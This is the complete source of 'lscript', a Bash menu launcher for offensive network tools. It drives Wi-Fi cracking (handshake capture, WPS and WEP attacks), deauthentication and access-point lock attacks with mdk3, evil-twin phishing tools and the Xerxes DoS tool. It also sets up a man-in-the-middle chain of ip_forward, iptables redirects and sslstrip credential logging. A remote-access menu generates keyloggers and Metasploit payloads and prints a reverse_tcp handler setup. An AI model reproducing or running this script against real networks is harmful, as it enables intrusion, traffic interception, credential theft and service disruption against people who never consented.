#! /bin/bash
VERSION=1.6
#############DEFAULTS###############
#setting yellow-start 
YS="\e[1;33m"
#setting color-end
CE="\e[0m"
#setting red-start
RS="\e[1;31m"
#setting frequent stings
YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
PAKTC="Press "$YS"any key$CE to continue..."
PAKTGB="Press "$YS"any key$CE to go back..."

####################################
function interface_selection
{
echo -e "$YS 1$CE) $WLANN"
echo -e "$YS 2$CE) $WLANNM"
echo -e "$YS 3$CE) Eth0"
echo -e ""$YS"00$CE) Main menu"
echo -e "$YS 0$CE) EXIT"
read -e MYINT
if [ "$MYINT" = "2" ]
then
	MYINT="$WLANNM"
elif [ "$MYINT" = "1" ]
then
	MYINT="$WLANN"
elif [ "$MYINT" = "0" ]
then
	clear
	exit
elif [ "$MYINT" = "00" ]
then
	exec bash "$0"
elif [ "$MYINT" = "3" ]
then
	MYINT="eth0"
else
echo -e "Wrong choice..."
sleep 2
clear
echo -e "EXITING"
sleep 1
exec bash "$0"
fi
export MYINT
}
function set_interface_number
{
echo -e "Enter the number of your wireless card(etc type "$YS"0"$CE" if wlan0): " 
read INUMB
echo -e "So your wireless interfaces are wlan$INUMB and wlan"$INUMB"mon?"$YNYES": "
read INTCONFNUMB
if [ "$INTCONFNUMB" = "n" ]
then
	clear
	echo -e "Then why did you type that? lol"
	sleep 3
	exec bash "$0"
else
	echo wlan$INUMB > /root/lscript/wlan.txt
	echo wlan"$INUMB"mon > /root/lscript/wlanmon.txt
	echo -e "Done "
	sleep 1
	clear
	echo -e "If you want to change it, type "$YS"interface"$CE" any time"
	sleep 1
	echo -e "$PAKTC"
	read	
fi
}
if [ -f "/root/lscript/IAGREE.txt" ]
then

	if [ ! -f "/root/lscript/wlan.txt" ]
	then
		set_interface_number
	fi
	
clear
WLANNM=$(cat /root/lscript/wlanmon.txt)
WLANN=$(cat /root/lscript/wlan.txt)
export WLANNM
export WLANN
echo -e ""
echo -e "$RS         ██╗      █████╗ ███████╗██╗   ██╗$CE v$VERSION"
echo -e "$RS         ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝$CE"
echo -e "$RS         ██║     ███████║  ███╔╝  ╚████╔╝ $CE   by "$RS"ARIS MELACHROINOS$CE"
echo -e "$RS         ██║     ██╔══██║ ███╔╝    ╚██╔╝  $CE"
echo -e "$RS    The  ███████╗██║  ██║███████╗   ██║  script$CE"
echo -e "$RS         ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   $CE"
echo -e ""$YS"if"$CE") Ifconfig"
echo -e ""$YS" 1"$CE") Enable $WLANN                      "$YS"d1"$CE") Disable $WLANN"
echo -e ""$YS" 2"$CE") Enable $WLANNM                   "$YS"d2"$CE") Disable $WLANNM"
echo -e ""$YS" 3"$CE") Change MAC                        "$YS"d3"$CE") Restore original MAC"
echo -e ""$YS" 4"$CE") Enable 4nonimizer                 "$YS"d4"$CE") Disable 4nonimizer"
echo -e ""$YS" 5"$CE") Enable anonsurf                   "$YS"d5"$CE") Disable anonsurf"
echo -e ""$YS" 6"$CE") Status of anonsurf                "$YS"d6"$CE") Restart anonsurf"
echo -e ""$YS" 7"$CE") View your Public IP"
echo -e ""$YS" 8"$CE") View your MAC"
echo -e ""$YS" 9"$CE") TOOLS"
echo -e ""$YS"10"$CE") Handshake       (WPA-WPA2)        "$YS"start"$CE") 1 2 3"
echo -e ""$YS"11"$CE") Find WPS pin    (WPA-WPA2)         "$YS"stop"$CE") d1 d2 d3"
echo -e ""$YS"12"$CE") WEP hacking     (WEP)            "$YS"update"$CE") Check for updates"
echo -e ""$YS"13"$CE") MITM                             "$YS"errors"$CE") Fix some errors"
echo -e "$YS 0"$CE") EXIT"
echo "Choose: "
read -e YORNAA
clear
	if [ "$YORNAA" = "0" ]
	then
		exit
	elif [ "$YORNAA" = "interface" ]
	then
		clear
		WLANN=$(cat /root/lscript/wlan.txt)
		WLANNM=$(cat /root/lscript/wlanmon.txt)
		echo -e "Your current wireless interface names are $WLANN and $WLANNM"
		sleep 2
		echo -e "Do you want to change you interface number?"$YNYES": "
		read INAG
		if [ "$INAG" = "n" ]
		then
			clear
			echo -e "Then why did you come here? lol"
			sleep 2
			exec bash "$0"
		else
			clear
			rm /root/lscript/wlan.txt
			rm /root/lscript/wlanmon.txt
			set_interface_number
		fi
	elif [ "$YORNAA" = "9" ]
	then
		echo -e "------------------------------"$RS"TOOLS"$CE"------------------------------"
		echo -e ""$YS" 1"$CE") Wifi tools"
		echo -e ""$YS" 2"$CE") Remote access"
		echo -e ""$YS"00"$CE") Main menu"
		echo -e ""$YS" 0"$CE") EXIT"
		echo "Choose: "
		read -e CATEG
			if [ "$CATEG" = "1" ]
			then
				clear
				echo -e "---------------------------"$RS"WIFI TOOLS"$CE"----------------------------"
				echo -e ""$YS" 1"$CE") Fluxion            Multitool-Fake AP with pass confirmation"
				echo -e ""$YS" 2"$CE") Wifite             Multitool"
				echo -e ""$YS" 3"$CE") Wifiphisher        Multitool-Fake AP etc.."
				echo -e ""$YS" 4"$CE") Zatacker           MITM-NMAP-Mail Spammer..(Install it manually)"
				echo -e ""$YS" 5"$CE") Morpheus           ------------ULTIMATE MITM SUIT------------"
				echo -e ""$YS" 6"$CE") Osrfconsole        Checks usernames-phones to platforms etc.."
				echo -e ""$YS" 7"$CE") Hakku              Multitool-mail bomb-sniffs-cracks etc.."
				echo -e ""$YS" 8"$CE") Trity              Multitool-locate ip-email bombs-brutforse etc.."
				echo -e ""$YS" 9"$CE") Cupp               Make specific worldlists"
				echo -e ""$YS"10"$CE") Dracnmap           Many scan options"
				echo -e ""$YS"11"$CE") Fern               Wifi cracker GUI"
				echo -e ""$YS"12"$CE") Netdiscover        IPs and MACs on your net"
				echo -e ""$YS"13"$CE") KickThemOut        Kick clients out of your network"
				echo -e ""$YS"14"$CE") Ghost-Phisher      Fake AP,MITM,Session hijacking etc..."
				echo -e ""$YS"15"$CE") The Eye            Detects ARP poisoning DNS spoofing etc..."
				echo -e ""$YS"16"$CE") Xerxes             The most powerful DoS tool(CAUTION)"
				#~ echo -e ""$YS"16"$CE") ShARP(problematic) Detects who is spoofing on your network"
				echo -e ""$YS"17"$CE") Mdk3-master        Tries to lock / reboot AP and more..."
				echo -e ""$YS"18"$CE") Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
				echo -e ""$YS"19"$CE") Katana Framework   Many penetration testing features"
				echo -e ""$YS"20"$CE") Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
				echo -e ""$YS"00"$CE") Main menu"
				echo -e ""$YS" 0"$CE") EXIT"
				echo -e "Choose: "
				read -e APPP
				if [ "$APPP" = "1" ]
				then
					clear
					cd /root/fluxion
					./fluxion
					cd
				elif [ "$APPP" = "2" ]
				then
					clear
					wifite
				elif [ "$APPP" = "3" ]
				then
					clear
					echo -e "Do you have 1 or 2 wireless interfaces?: "
					read ONEORTWO
					if [ "$ONEORTWO" = "1" ]
					then
						clear
						echo -e "Note that with only 1 wireless interface, wifiphisher doesn't deauthenticate the AP."
						sleep 1
						echo -e ""
						echo -e "$PAKTC"
						read
						clear
						wifiphisher -nJ
					else
						clear
						wifiphisher
					fi
				elif [ "$APPP" = "4" ]
				then
					if [ -d "/root/Zatacker" ]
					then
						clear	
						cd /root/Zatacker
						./ZT.sh
						cd
					else
						echo -e "You have to install it manually since its not on github.Sorry."
						sleep 4
						exec bash "$0"
					fi
				elif [ "$APPP" = "5" ]
				then
					clear	
					cd /root/morpheus
					./morpheus.sh
					cd
				elif [ "$APPP" = "7" ] 
				then
					clear
					echo -e "type: 'show modules' to start"
					sleep 2
					clear
					cd /root/hakkuframework
					./hakku
					cd
				elif [ "$APPP" = "8" ]
				then
					clear	
					echo -e "type: 'help' to start"
					sleep 2
					clear
					trity			
				elif [ "$APPP" = "9" ]
				then
					clear	
					cd /root/cupp
					python cupp.py -i
					cd			
				elif [ "$APPP" = "10" ]
				then
					clear	
					cd /Dracnmap/
					./dracnmap-v*.sh	
					cd		
				elif [ "$APPP" = "11" ]
				then
					clear	
					cd /root/Fern-Wifi-Cracker
					python execute.py
					cd
				elif [ "$APPP" = "12" ]
				then
					clear	
					netdiscover
				elif [ "$APPP" = "13" ]
				then
					clear	
					cd /root/kickthemout
					python kickthemout.py
					cd
				elif [ "$APPP" = "14" ]
				then
					clear	
					cd /root/ghost-phisher/Ghost-Phisher
					python ghost.py
					cd
				elif [ "$APPP" = "15" ]
				then
					clear	
					cd /root/The-Eye
					./TheEye
					cd
				elif [ "$APPP" = "16" ]
				then
					clear
					echo -e "Do you own the site you want to DoS?"$YNONLY""
					read DOSTERM
					if [ "$DOSTERM" = "y" ]
					then

						clear
						echo -e "Enter your site(etc iownthissite.com): "
						echo -e "(without www)"
						read -e SITEDOS
						clear
						echo -e "Launching www.isitdownrightnow.com for $SITEDOS"
						sleep 4
						xdg-open http://www.isitdownrightnow.com/"$SITEDOS".html
						clear	
						cd /root/xerxes
						SITEDOSX=www.$SITEDOS
						echo -e "Press "$YS"any key"$CE" to start DoS on $SITEDOSX"
						read
						./xerxes $SITEDOSX 80
					else
						clear
						echo -e "Then never try this."
						sleep 3
						exec bash "$0"
					fi
				elif [ "$APPP" = "17" ]
				then
					clear	
					echo -e "Press "$YS"CTRL C"$CE" when you find your target AP"
					echo -e "Press "$YS"any key"$CE" to start scanning."
					read
					airodump-ng $WLANNM
					echo -e "Enter your target's BSSID: "
					read -e MDBSSID
					echo -e "Enter your target's channel: "
					read -e MDCHANN
					echo -e "Enter frames per second(etc 50): "
					read -e FPS
					clear
					xterm -e 'mdk3 $WLANNM t $MDCHANN $MDBSSID $FPS'		
				elif [ "$APPP" = "18" ]
				then
					clear	
					echo -e "Press "$YS"any key"$CE" to start scanning with wash."
					read
					gnome-terminal -e 'wash -i $WLANNM'
					echo -e "Enter your target's BSSID: "
					read -e MDBSSID
					echo -e "Enter your target's ESSID: "
					read -e MDESSID
					#~ echo -e "Enter your target's channel: "
					#~ read -e MDCHANN
					echo -e "Enter frames per second(etc 50): "
					read -e FPS
					clear
					xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
				elif [ "$APPP" = "19" ]
				then
					clear	
					ktf.console
				elif [ "$APPP" = "20" ]
				then
					clear	
					cd /root/airgeddon
					./airgeddon.sh
					cd
				elif [ "$APPP" = "6" ]
				then
					clear	
					echo -e ""$YS" 1"$CE") usufy"
					echo -e ""$YS" 2"$CE") mailfy"
					echo -e ""$YS" 3"$CE") searchfy"
					echo -e ""$YS" 4"$CE") domainfy"
					echo -e ""$YS" 5"$CE") phonefy"
					echo -e ""$YS" 6"$CE") entify"
					echo -e ""$YS"00"$CE") Main menu"
					echo -e ""$YS" 0"$CE") EXIT"
					echo -e "Choose: "
					read -e OSFR
						if [ "$OSFR" = "1" ]
						then
							clear
							echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
							usufy.py
							exit
						elif [ "$OSFR" = "2" ]
						then
							clear
							echo -e "Use: mailfy.py -n name1"
							mailfy.py
							exit
						elif [ "$OSFR" = "3" ]
						then
							clear
							searchfy.py
							exit
						elif [ "$OSFR" = "4" ]
						then
							clear
							domainfy.py
							exit
						elif [ "$OSFR" = "5" ]
						then
							clear
							phonefy.py
							exit
						elif [ "$OSFR" = "6" ]
						then
							clear
							entify.py
							exit
						elif [ "$OSFR" = "0" ]
						then
							clear
							exit
						elif [ "$OSFR" = "00" ]
						then
							clear
							exec bash "$0"
						else 
							echo -e "I can't do that bro..."
							sleep 2
							clear
							echo -e "Let's try again..."
							sleep 1
							exec bash "$0"
						fi
				elif [ "$APPP" = "0" ]
				then
					clear
					exit
				elif [ "$APPP" = "00" ]
				then
					clear
					exec bash "$0"
				fi
			elif [ "$CATEG" = "2" ]
			then
				clear
				echo -e "-------------------------"$RS"Remote access"$CE"---------------------------"
				echo -e ""$YS" 1"$CE") BeeLogger		Generate keylogger"
				echo -e ""$YS" 2"$CE") Ezsploit      Generate payloads for many platforms,listeners etc..."
				echo -e ""$YS"00"$CE") Main menu"
				echo -e ""$YS" 0"$CE") EXIT"
				echo -e "Choose: "
				read -e KEYLOG
				if [ "$KEYLOG" = "1" ]
				then
					cd /root/BeeLogger
					python bee.py
					cd
				elif [ "$KEYLOG" = "2" ]
				then
					clear
					cd /root/ezsploit/
					./ezsploit.sh
					cd
					echo -e "TUTORIAL AFTER GENERATION OF PAYLOAD"
					echo -e "Open a new terminal and type:"
					echo -e "msfconsole"
					echo -e "use exploit/multi/handler"
					echo -e "THIS DEPENDS ON THE PLAYLOAD TYPE. ETC FOR ANDROID IS: set payload android/meterpreter/reverse_tcp"
					echo -e "set lhost <YOUR IP HERE>"
					echo -e "set lport 4444"
					echo -e "exploit"
					echo -e "Press "$YS"any key"$CE" to leave..."
					read
					exec bash "$0"
				elif [ "$KEYLOG" = "00" ]
				then
					clear
					exec bash "$0"
				elif [ "$KEYLOG" = "0" ]
				then
					clear
					exit
				fi
			elif [ "$CATEG" = "0" ]
			then
				clear
				exit
			elif [ "$CATEG" = "00" ]
			then
				clear
				exec bash "$0"
			fi	
	elif [ "$YORNAA" = "clear" ]
	then
		echo -e "Ok.I can clear for you..."
		sleep 1
		clear
		exec bash "$0"
	elif [ "$YORNAA" = "gg" ]
	then
		geany /bin/lscript/l
	elif [ "$YORNAA" = "1" ]
	then
		echo -e "Enabling $WLANN..."
		rfkill unblock wifi; rfkill unblock all
		ifconfig $WLANN up
		echo -e "Done."
	elif [ "$YORNAA" = "d1" ]
	then
		echo -e "Disabling $WLANN..."
		rfkill unblock wifi; rfkill unblock all
		ifconfig $WLANN down
		echo -e "Done."
	elif [ "$YORNAA" = "2" ]
	then
		echo -e "Enabling $WLANNM..."
		echo -e "Killing services..."
		airmon-ng check kill
		echo -e "Done."
		echo -e "Starting monitor mode..."
		airmon-ng start $WLANN
		echo -e "Done."
	elif [ "$YORNAA" = "d2" ]
	then
		echo -e "Disabling $WLANNM..."
		echo -e "Stopping monitor mode..."
		airmon-ng stop $WLANNM
		echo -e "ok..."
		echo -e "Starting network-manager service..."
		service network-manager start
		echo -e "ok..."
		echo -e "$WLANN is probably up.Bring it down?"$YNNO": "
		read -e YORN
		if [ "$YORN" = "y" ] 
		then
			#rfkill unblock wifi
			#rfkill unblock all
			ifconfig $WLANN down
			echo -e "$WLANN is now down."
		fi
	elif [ "$YORNAA" = "3" ]
	then
		interface_selection
		clear
		echo -e "Changing mac address of $MYINT to a random one..."
		ifconfig $MYINT down
		macchanger -r $MYINT
		ifconfig $MYINT up
		echo -e "Done."
	elif [ "$YORNAA" = "d3" ]
	then
		interface_selection
		clear
		echo -e "Changing mac address of $MYINT to the original one..."
		ifconfig $MYINT down
		macchanger -p $MYINT
		ifconfig $MYINT up
		echo -e "Done."
	elif [ "$YORNAA" = "4" ]
	then
		echo -e "Enabling 4nonimizer..."
		4nonimizer start
		echo -e "Done."
	elif [ "$YORNAA" = "d4" ]
	then
		echo -e "Disabling 4nonimizer..."
		4nonimizer stop
		echo -e "Done."
	elif [ "$YORNAA" = "5" ]
	then
		echo -e "Enabling anonsurf..."
		anonsurf start
		echo -e "Done."
	elif [ "$YORNAA" = "d5" ]
	then
		echo -e "Disabling anonsurf..."
		anonsurf stop
		echo -e "Done."
	elif [ "$YORNAA" = "6" ]
	then
		echo -e "Status of anonsurf..."
		anonsurf status
		echo -e "Done."
	elif [ "$YORNAA" = "d6" ]
	then
		echo -e "Restarting anonsurf..."
		anonsurf change
		echo -e "Done."
	elif [ "$YORNAA" = "r6" ]
	then
		echo -e "Restarting anonsurf..."
		anonym8 change
		echo -e "Done."
	elif [ "$YORNAA" = "7" ]
	then
		clear
		CHECKMON=$(ifconfig | grep "mon")
		if [ "$CHECKMON" = "" ]
		then
			echo "Your public IP is: "
			curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'
		else
			echo -e "When monitor mode is enabled, you don't have internet access."
			echo -e "Select 'd2' to disable monitor mode"
			echo -e "$PAKTGB"
			read
			clear
			exec bash "$0"
		fi
	elif [ "$YORNAA" = "8" ]
	then
		interface_selection
		clear
		echo "Your MACs: "
		macchanger -s $MYINT
	elif [ "$YORNAA" = "10" ]
	then
		clear
		CHECKMON=$(ifconfig | grep "mon")
		if [ "$CHECKMON" = "" ]
		then
			echo -e "Monitor mode is not enabled."
			echo -e "Select 'start' or '2' to enable it"
			echo -e "$PAKTGB"
			read
			clear
			exec bash "$0"
		else
			echo -e "Moving into new terminal..."
			sleep 1
			FJC=0
			export FJC
			gnome-terminal --geometry 80x25+9999+0 -e lh1
			sleep 1
			exec bash "$0"
			#~ gnome-terminal --geometry 80x25+0+0 -e l
		fi
	elif [ "$YORNAA" = "11" ]
	then
		clear
		CHECKMON=$(ifconfig | grep "mon")
		if [ "$CHECKMON" = "" ]
		then
			echo -e "Monitor mode is not enabled."
			echo -e "Select 'start' or '2' to enable it"
			echo -e "$PAKTGB"
			read
			clear
			exec bash "$0"
		else
			clear
			echo -e "Moving into new terminal..."
			sleep 1
			gnome-terminal --geometry 80x25+9999+0 -e lh3
			sleep 1
			exec bash "$0"
		fi
	elif [ "$YORNAA" = "12" ]
	then
		clear
		CHECKMON=$(ifconfig | grep "mon")
		if [ "$CHECKMON" = "" ]
		then
			echo -e "Monitor mode is not enabled."
			echo -e "Select 'start' or '2' to enable it"
			echo -e "$PAKTGB"
			read
			clear
			exec bash "$0"
		else
			echo -e "Moving into new terminal..."
			sleep 1
			gnome-terminal --geometry 80x25+9999+0 -e lh4
			sleep 1
			exec bash "$0"
		fi
	elif [ "$YORNAA" = "13" ]
	then
		while true
		do
		clear
		echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
		echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward "
		echo -e ""$YS" 2"$CE") Set iptables"
		echo -e ""$YS" 3"$CE") Scan and select target IP         "$YS"33"$CE") I have scaned"
		echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
		echo -e ""$YS"00"$CE") Main menu"
		echo -e ""$YS" 0"$CE") EXIT"
		echo -e "Choose: "
		read -e MITMCH
		if [ "$MITMCH" = "1" ]
		then
			echo "1" > /proc/sys/net/ipv4/ip_forward
			echo -e "Done."
			sleep 1
		elif [ "$MITMCH" = "d1" ]
		then
			echo "0" > /proc/sys/net/ipv4/ip_forward
			echo -e "Done."
			sleep 1
		elif [ "$MITMCH" = "2" ]
		then
			clear
			echo -e "Redirect tcp port 80 to port("$YS"Enter"$CE"=8080):"
			read PORTTCP
			if [ "$PORTTCP" = "" ]
			then
				PORTTCP="8080"
			fi
						clear
			echo -e "Redirect udp port 40 to port("$YS"Enter"$CE"=40):"
			read PORTUDP
			if [ "$PORTUDP" = "" ]
			then
				PORTUDP="40"
			fi
			iptables --flush
			iptables --flush -t nat
			iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
			iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
			echo -e "Done."
			sleep 1
		elif [ "$MITMCH" = "3" ]
		then
			clear
			route -n
			echo -e ""
			echo -e ""
			echo -e "Enter your gateway(prefer eth0 gateway):"
			read GATENM
			echo -e ""
			echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
			read GATEINT
			if [ "$GATEINT" = "" ]
			then
				GATEINT="eth0"
			fi
			clear		
			nmap -sP "$GATENM"/24
			echo -e ""
			echo -e ""
			echo -e "Enter your target IP:"
			read TARGIP
			echo -e ""
			echo -e "$PAKTC"
			read
			export GATENM
			export GATEINT
			export TARGIP
			export PORTTCP
			export PORTUDP
			cd /root/lscript/ls
			gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
			gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
			gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
			sslstrip -l $PORTTCP -w /root/sslstrip.log
			echo -e "$PAKTGB"
			read
			continue
		elif [ "$MITMCH" = "33" ]
		then
			clear
			echo -e "Enter your gateway(prefer eth0 gateway):"
			read GATENM
			echo -e ""
			echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
			read GATEINT
			if [ "$GATEINT" = "" ]
			then
				GATEINT="eth0"
			fi
			clear
			echo -e "Enter your target IP:"
			read TARGIP
			echo -e ""
			echo -e "$PAKTC"
			read
			export GATENM
			export GATEINT
			export TARGIP
			export PORTTCP
			export PORTUDP
			cd /root/lscript/ls
			gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
			gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
			gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
			sslstrip -l $PORTTCP -w /root/sslstrip.log
			echo -e "$PAKTGB"
			read
			continue
		elif [ "$MITMCH" = "4" ]
		then
			leafpad /root/sslstrip.log
		#~ elif [ "$MITMCH" = "44" ]
		#~ then
		elif [ "$MITMCH" = "00" ]
		then
			clear
			exec bash "$0"
		elif [ "$MITMCH" = "0" ]
		then
			clear
			exit
		fi
		done
	elif [ "$YORNAA" = "update" ]
	then
		#----------update-check-----------
		clear
		echo -e "Checking for updates..."
		TESTINTERNETCONNECTION=$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')
		if [ "$TESTINTERNETCONNECTION" != "" ]
		then
			VER=$(timeout -s SIGTERM 20 curl "https://raw.githubusercontent.com/arismelachroinos/lscript/master/version.txt" 2>/dev/null)
			if [ "$VERSION" != "$VER" ]
			then
			clear
			echo -e "There is an update available."
			echo -e "Current version: $VERSION"
			echo -e "Updated version: $VER"
			echo -e "$PAKTC"
			read
			clear
			echo -e "Do you want to update?"$YNONLY": "
			read UPDATEYN
			if [ "$UPDATEYN" = "y" ]
			then
				clear
				echo -e "Making new directory for the old lscript (will pass it to /root/lscriptold)"
				sleep 2
				mkdir /root/lscriptold
				echo -e ""
				echo -e "Moving lscript to lscriptold"
				sleep 2
				mv /root/lscript /root/lscriptold
				echo -e "Cloning the latest github version to new /root/lscript"
				sleep 2
				cd
				git clone https://github.com/arismelachroinos/lscript.git
				cd /root/lscript
				chmod +x install.sh
				clear
				echo -e "Ok , everything seems to be fine by now."
				sleep 1
				echo -e "A new terminal will open, and then the new install.sh will run to update the lscript.I will close."
				echo -e ""
				sleep 4
				echo -e "$PAKTC"
				read
				cd /root/lscript
				gnome-terminal -e ./install.sh
				clear 
				sleep 1
				echo -e ""
				echo -e "Removing old lscript"
				rm -rf /root/lscriptold
				echo -e "Exiting..."
				sleep 1
				exit
			else 
				clear
				echo -e "You didnt select "y" so you go back..."
				sleep 3
				exec bash "$0"
			fi
			else
			echo -e "There is no update available"
			sleep 1
			echo -e "Installed version: $VERSION"
			sleep 1
			echo -e "Github version:    $VER"
			sleep 1
			echo -e "$PAKTGB"
			read		
			exec bash "$0"
			fi
		else
			clear
			echo -e "There is no connection."
			sleep 1
			echo -e "Maybe you should type 'stop' in the main manu to gain internet access again"
			echo -e ""
			echo -e "$PAKTGB"
			read
			exec bash "$0"
		fi
	elif [ "$YORNAA" = "if" ]
	then
		ifconfig
	elif [ "$YORNAA" = "errors" ]
	then
		#---------------------------------------------------------------------------------------------------------------------------
		echo -e "-----------------------------"$RS"ERRORS"$CE"------------------------------"
		echo -e ""$YS" 1"$CE") Fix no audio issue"
		echo -e ""$YS" 2"$CE") No output in wash"
		#~ echo -e " 2) "
		echo -e ""$YS"00"$CE") Main menu"
		echo -e ""$YS" 0"$CE") EXIT"
		echo -e " Choose: "
		read ERRS
		if [ "$ERRS" = "1" ]
		then
			clear
			echo -e "Trying to get you some audio..."
			sleep 2
			clear
			echo -e "Press "$YS"y"$CE" if/when prompted"
			sleep 3
			clear
			echo -e "Installing pulseaudio......."
			sleep 1
			apt-get pulseaudio
			echo -e "Enabling pulseaudio......."
			sleep 1
			systemctl --user enable pulseaudio && systemctl --user start pulseaudio
			clear
			echo -e "Done!"
			sleep 1
			clear
			echo -e "I mean...Try to see if you have audio."
			sleep 3
			echo -e " "
			echo -e "That's all i can do :/"
			sleep 2
			echo -e " "
			echo -e "If it wasn't fix , then try rebooting"
		elif [ "$ERRS" = "2" ]
		then
			clear
			echo -e "Ok...Lets try to fix this..."
			sleep 1
			mkdir /etc/reaver
			echo -e "It seems to be fixed."
			echo -e "Enter you interface"
			read INTWASH
			echo -e "Press "$YS"many key"$CE" to test wash"
			echo -e "Also try "wash -i wlan0mon -a" to display all networks"
			wash -i $INTWASH
		elif [ "$ERRS" = "0" ]
		then
			clear
			echo -e "EXITING"
			sleep 1
			clear
			exit
		elif [ "$ERRS" = "00" ]
		then
			clear
			exec bash "$0"
		else
			clear
			echo -e "Not an valid option...."
			exec bash "$0"
		fi
		#---------------------------------------------------------------------------------------------------------------------------
	elif [ "$YORNAA" = "start" ]
	then
		echo -e "Changing MAC of eth0 to 00:11:22:33:44:55..."
		ifconfig eth0 down
		macchanger -m 00:11:22:33:44:55 eth0 | grep "New MAC:"
		ifconfig eth0 up
		echo -e "Enabling $WLANN..."
		rfkill unblock wifi; rfkill unblock all
		ifconfig $WLANN up
		echo -e "$WLANN enabled"
		#~ echo -e "Changing MAC of $WLANN to 00:11:22:33:44:55..."
		#~ ifconfig $WLANN down
		#~ macchanger -m 00:11:22:33:44:55 $WLANN | grep "New MAC:"
		#~ ifconfig $WLANN up
		echo -e "Enabling $WLANNM..."
		echo -e "Killing services..."
		airmon-ng check kill
		echo -e "Done."
		echo -e "Starting monitor mode..."
		airmon-ng start $WLANN
		echo -e "Done."
		echo -e "Changing mac address of $WLANNM to 00:11:22:33:44:55..."
		ifconfig $WLANNM down
		macchanger -m 00:11:22:33:44:55 $WLANNM | grep "New MAC:"
		ifconfig $WLANNM up
		echo -e "Done."
		echo -e "SUCCESS!"
#----------
		elif [ "$YORNAA" = "stop" ]
		then
		echo -e "Changing mac address of $WLANNM to the original one..."
		ifconfig $WLANNM down
		macchanger -p $WLANNM
		ifconfig $WLANNM up
		echo -e "Disabling $WLANNM..."
		echo -e "Stopping monitor mode..."
		airmon-ng stop $WLANNM
		echo -e "ok..."
		echo -e "Starting network-manager service..."
		service network-manager start
		echo -e "ok..."
		#~ echo -e "$WLANN is probably down.Bring it up?(\e[1;33my\e[0m/\e[1;33mn\e[0m)(\e[1;33mEnter\e[0m=no): "
		#~ read -e YORN
		#~ if [ "$YORN" = "y" ]  
		#~ then
			#~ #rfkill unblock wifi
			#~ #rfkill unblock all
			#~ ifconfig $WLANN up
			#~ echo -e "$WLANN is now up."
		#~ fi
		echo -e "Changing mac address of $WLANN to the original one..."
		ifconfig $WLANN down
		macchanger -p $WLANN
		ifconfig $WLANN up
		echo -e "Changing mac address of eth0 to the original one..."
		ifconfig eth0 down
		macchanger -p eth0
		ifconfig eth0 up
		echo -e "Done."
		echo -e "SUCCESS!"
	else
		echo -e "I can't do that bro..."
		sleep 1
		clear
		echo -e "Let's try again..."
		sleep 1
		exec bash "$0"
	fi
echo -e "Choose again?"$YNYES": "
read -e YORNLAST
if [ -z "$YORNLAST" ]
then
	clear
	exec bash "$0"
elif [ "$YORNLAST" = "y" ]
then
	clear
	exec bash "$0"
else 
	clear
	exit
fi
else
	echo -e "You need to accept the terms."
	sleep 1
	echo -e "$PAKTC"
	read
	clear
	echo -e "This tool is only for educational purposes only."
	sleep 2
	echo -e "Use this tool only on your own network and never without permission."
	sleep 2
	echo -e "I am not responsible for anything you do with this tool."
	sleep 2
	echo -e "Will you use this tool only on your own network and only with your own responsibility?("$YS"YES"$CE"/"$YS"NO"$CE"): "
	read YESORNO
	if [ "$YESORNO" = "YES" ]
	then 
		echo "You have agreed the terms and you use this tool with your own responsibility." > /root/lscript/IAGREE.txt
		sleep 1
		clear
	fi
	exec bash "$0"
fi
